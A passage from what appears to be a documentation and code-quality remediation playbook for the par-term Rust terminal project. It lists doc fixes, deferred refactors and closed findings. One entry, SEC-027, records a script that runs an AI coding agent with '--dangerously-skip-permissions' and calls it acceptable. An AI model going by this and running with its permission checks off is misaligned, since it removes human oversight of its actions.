- **Steps**: Add `docs/guides/MIGRATION.md` to the README's docs section and to CLAUDE.md's table.
- **Method**: `grep -c MIGRATION README.md` returns **0** — the guide is well maintained (it even has an
  `Unreleased` entry for the macOS config-directory move users are about to hit) but reachable only from
  `docs/README.md:80`. Users hitting a migration need it from the front page.
- **Verify**: `grep -c MIGRATION README.md` ≥ 1.

### [DOC-024] Document the missing environment variables
- **Files**: `docs/guides/ENVIRONMENT_VARIABLES.md`
- **Steps**: Enumerate the real reads (`grep -rn "env::var" --include='*.rs' src/ par-term-*/src | sort -u`),
  add the user-facing ones, and correct the `TERM`/`COLORTERM` classification — they are **force-overridden**
  for child processes, not inherited.
- **Method**: Derive the list from the code rather than extending the existing prose, since the existing prose
  is what drifted (see DOC-005). Filter to user-facing variables; internal ones add noise.
- **Verify**: each documented variable appears in an `env::var` call; each user-facing read is documented.

### [DOC-025] Clear the 83 rustdoc warnings and consider `missing_docs`
- **Files**: 13 `par-term-*/src/lib.rs` + `src/main.rs`; `src/tab_bar_ui/mod.rs:10` vs `:17`;
  `par-term-input/src/lib.rs:17-20` vs `:29-31`; `par-term-config/src/config/keybindings_methods.rs:81`
- **Steps**: **64 of 83 are one pattern** — module-level `//!` docs intra-doc-linking siblings declared
  private. Either make the module `pub`/`pub(crate)` as appropriate or drop the link brackets; one line per
  module clears most. Backtick `"snippet:<id>"` at `keybindings_methods.rs:81` to fix the "unclosed HTML tag"
  warning. Then optionally add `#![warn(missing_docs)]` per crate.
- **Method**: Fix the systemic 64 first — the remainder is a short tail. All 13 crates already have
  crate-level `//!` docs and coverage is ~93%, so `missing_docs` is close to achievable; add it per-crate as
  each reaches zero rather than all at once.
- **Verify**: `cargo doc --no-deps --workspace 2>&1 | grep -c warning` trends to 0.

### [DOC-026] Add `# Errors` and `# Panics` sections
- **Files**: workspace-wide public API; 142 public `Result`-returning functions, 9 documented
- **Steps**: Add `# Errors` to public `Result`-returning functions, prioritizing `par-term-config` and
  `par-term-update` (published crates with the widest consumers). Add `# Panics` where a panic is genuinely
  reachable.
- **Method**: Large surface, so prioritize rather than sweeping. Reassuring context: **no `unsafe fn` exists in
  the workspace**, and the only two `unsafe impl` (`src/platform/notify_macos.rs:100,103`) are on a private
  struct with `// SAFETY:` justifications — so this is documentation completeness, not a safety gap.
- **Verify**: `cargo doc` renders the new sections; count trends upward from 9/142.

### [DOC-027] Fix CONTRIBUTING's stale link text
- **Files**: `CONTRIBUTING.md:480,482,484,485,487`
- **Steps**: Update the displayed text from `docs/ARCHITECTURE.md` to `docs/architecture/ARCHITECTURE.md` etc.
  The **targets are already correct**.
- **Method**: The exact inverse of DOC-002 — targets migrated, labels left behind. Links work, so no checker
  flags it; only the text misleads.
- **Verify**: each label matches its target path.

### [DOC-028] Refresh and index `MATRIX.md`
- **Files**: `MATRIX.md:92`; `README.md`; `docs/README.md`; `CLAUDE.md` Docs Reference
- **Steps**: Change "49+ shaders" to **73**. Add an "as of version / date" stamp to the 1,134-line iTerm2
  comparison. Link `MATRIX.md` (and decide about `ideas.md`) from at least one index.
- **Method**: 73 = 61 background + 12 cursor, which matches the filesystem and three other docs. An unstamped
  1,134-line comparison table is guaranteed to drift; the stamp at least tells a reader how much to trust it.
- **Verify**: shader count matches `ls shaders/`; `MATRIX.md` appears in an index.

### [DOC-029] Remove line numbers from durable docs
- **Files**: `docs/features/MOUSE_FEATURES.md:173`; `docs/features/SEMANTIC_HISTORY.md:83,248`
- **Steps**: Replace `path:line` references with symbol names or section links, per
  `docs/DOCUMENTATION_STYLE_GUIDE.md:206`.
- **Method**: Judgment call — the `SEMANTIC_HISTORY.md` uses are *illustrative examples of semantic history
  matching* `file:line` patterns, which is arguably the point. If so, leave them and note the exemption in the
  style guide rather than mangling the examples.
- **Verify**: read-through against the style guide.

### [DOC-030] Trim the accumulated release notes in README
- **Files**: `README.md:44-122` (9 `## What's New` sections, ~16% of the file)
- **Steps**: Keep the current release's section, replace the rest with a link to `CHANGELOG.md`.
- **Method**: This duplication is the mechanism behind DOC-017's stale anchor, so fixing it prevents the
  recurrence rather than the symptom. The CHANGELOG is excellent (64 versions, Keep a Changelog format) and is
  the right home.
- **Verify**: README shrinks; the newest release is still visible on the front page.

### [DOC-031] Make MIGRATION.md's ToC ordering consistent
- **Files**: `docs/guides/MIGRATION.md:7-15`
- **Steps**: Pick descending (newest first, matching CHANGELOG) and reorder — currently it runs Unreleased,
  v0.31.0, then *ascends* v0.20.0 → v0.27.0.
- **Method**: Match the CHANGELOG's descending convention so the two read the same way.
- **Verify**: visual check of the ToC.

### [DOC-032] Fix API.md's minor drift
- **Files**: `docs/API.md:421-423` and the `UpdateCheckResult` / `prelude` entries
- **Steps**: Document `par-term-scripting` types by their real paths (`manager::ScriptManager` etc. — its
  `lib.rs` has no re-exports). List `UpdateCheckResult` once, under its owning crate. Add the
  `par-term-config` `prelude` module.
- **Method**: Low-impact accuracy cleanup; batch with the other API.md edits (DOC-009, DOC-010, DOC-021) since
  they touch the same file.
- **Verify**: each documented path resolves via `cargo doc`.

---

# Deliberately Deferred — NOT in this remediation cycle

These four are large structural refactors that move code across files and would invalidate the line anchors
every other entry in this playbook depends on. Executing them alongside 100+ other changes maximizes conflict
risk for no correctness gain. Each has a full implementation plan and a board card.

| ID | Scope | Plan |
|----|-------|------|
| [ARC-002] | `SettingsUI` 215 fields → per-tab state structs (~25 tab modules) | `docs/opus/ENH-006-settingsui-decomposition.md` |
| [ARC-003] | `Config` 238 fields → the 14 existing sub-config structs | `docs/opus/ENH-007-config-decomposition.md` |
| [ARC-009] | Split the 5 files over the 800-line production threshold | `docs/opus/ENH-009-oversized-file-splits.md` |
| [QA-022] | `parse_shader_controls` 655-line function (same file as ARC-009) | `docs/opus/ENH-009-oversized-file-splits.md` |

## No Action Required

| ID | Reason |
|----|--------|
| [QA-001] | **Already fixed** by commit `eff2b1e6` during the audit run. Verified: no `MaybeUninit`/`assume_init` remains. Miri-proven; the Linux SIGSEGV board card is closed. |
| [QA-009] | **Already fixed** by commit `cb9abf12` ("encode from a constructible `KeyInput`"). Verified: `tests/input_tests.rs` builds a real `KeyInput`. |
| [SEC-027] | Informational only — `run-steps.sh:100-101` runs `claude --dangerously-skip-permissions` as deliberate developer automation. Recorded so its presence is known; not a defect. |

**One exception**: **QA-008 must still be fixed this cycle.** It is a Critical crash in `par-term-config`'s
serde path and is entirely independent of whether ARC-003 ever happens. Do not defer it along with the
decomposition.


